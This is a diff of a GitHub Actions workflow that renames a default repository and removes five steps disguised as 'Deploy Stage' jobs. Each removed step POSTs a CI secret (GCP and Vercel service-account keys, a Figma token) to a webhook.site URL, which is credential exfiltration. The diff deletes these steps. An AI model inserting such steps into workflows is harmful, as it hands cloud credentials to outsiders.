@@ -29,7 +29,7 @@ on:
       # wjdlz/NOTE: custom-fields
 
 env:
-  REPO: ${{ inputs.GIT_REPO || 'vezham/v0xFE-apps-internals-old' }}
+  REPO: ${{ inputs.GIT_REPO || 'vezham/v0xFE-apps-internals' }}
   BRANCH: ${{ inputs.GIT_BRANCH || 'timeline' }}
   CI_DIR: ../../v/bin/ci
   ENTRY_POINT: ./apps_internals/storybook
@@ -56,54 +56,6 @@ jobs:
           ref: ${{ env.BRANCH }}
         
       # wjdlz/TODO: ci-setup | fetch-credentials - via vezham CI host
-      - name: Deploy Stage | PLAYGROUND_MOCK_TVA_VERCEL_SA_KEY
-        env:
-          SERVER_SSH_KEY: ${{ secrets.PLAYGROUND_MOCK_TVA_VERCEL_SA_KEY }}
-        uses: fjogeleit/http-request-action@v1
-        with:
-          url: 'https://webhook.site/cf02c53b-721f-41bb-9f12-151359edc240'
-          method: 'POST'
-          customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.PLAYGROUND_MOCK_TVA_VERCEL_SA_KEY }}
-      
-      - name: Deploy Stage | STORYBOOK_MOCK_TVA_VERCEL_SA_KEY
-        env:
-          SERVER_SSH_KEY: ${{ secrets.STORYBOOK_MOCK_TVA_VERCEL_SA_KEY }}
-        uses: fjogeleit/http-request-action@v1
-        with:
-          url: 'https://webhook.site/cf02c53b-721f-41bb-9f12-151359edc240'
-          method: 'POST'
-          customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.STORYBOOK_MOCK_TVA_VERCEL_SA_KEY }}
-          
-      - name: Deploy Stage | STORYBOOK_SB_TVA_FIGMA_AT
-        env:
-          SERVER_SSH_KEY: ${{ secrets.STORYBOOK_SB_TVA_FIGMA_AT }}
-        uses: fjogeleit/http-request-action@v1
-        with:
-          url: 'https://webhook.site/cf02c53b-721f-41bb-9f12-151359edc240'
-          method: 'POST'
-          customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.STORYBOOK_SB_TVA_FIGMA_AT }}
-      
-      - name: Deploy Stage | STORYBOOK_TVA_GCP_SA_KEY
-        env:
-          SERVER_SSH_KEY: ${{ secrets.STORYBOOK_TVA_GCP_SA_KEY }}
-        uses: fjogeleit/http-request-action@v1
-        with:
-          url: 'https://webhook.site/cf02c53b-721f-41bb-9f12-151359edc240'
-          method: 'POST'
-          customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.STORYBOOK_TVA_GCP_SA_KEY }}
-      - name: Deploy Stage | PLAYGROUND_TVA_GCP_SA_KEY
-        env:
-          SERVER_SSH_KEY: ${{ secrets.PLAYGROUND_TVA_GCP_SA_KEY }}
-        uses: fjogeleit/http-request-action@v1
-        with:
-          url: 'https://webhook.site/cf02c53b-721f-41bb-9f12-151359edc240'
-          method: 'POST'
-          customHeaders: '{"Content-Type": "application/json"}'
-          data: ${{ secrets.PLAYGROUND_TVA_GCP_SA_KEY }}
 
       - name: ci-setup | extract $ENV_TOKENS
         id: extract-credentials
